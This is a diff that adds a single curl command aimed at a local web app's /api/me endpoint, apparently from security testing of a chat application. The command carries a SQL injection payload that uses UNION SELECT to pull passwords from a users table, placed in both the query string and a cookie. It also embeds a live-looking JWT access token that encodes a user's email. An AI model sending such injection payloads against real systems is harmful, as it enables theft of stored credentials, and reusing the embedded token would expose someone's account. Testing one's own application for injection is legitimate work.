@@ -1,0 +1,14 @@
+curl -k 'https://localhost:2443/api/me?search=1%20union%20select%20password%20from%20users' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.5' \
+  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
+  -H 'Referer: https://localhost:2443/chat' \
+  -H 'Content-Type: application/json' \
+  -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaW5lc0BnbWFpbC5jb20iLCJuYW1lIjoiaW5lcyIsImlhdCI6MTc1MzE4MzE3OH0.8o4fG_PcFtnsUHbxdxMbutB4v65ppBNJEMP8iZhFEdc' \
+  -H 'Connection: keep-alive' \
+  -H 'Cookie: search=1 union select password from users' \
+  -H 'Sec-Fetch-Dest: empty' \
+  -H 'Sec-Fetch-Mode: cors' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'Priority: u=4'
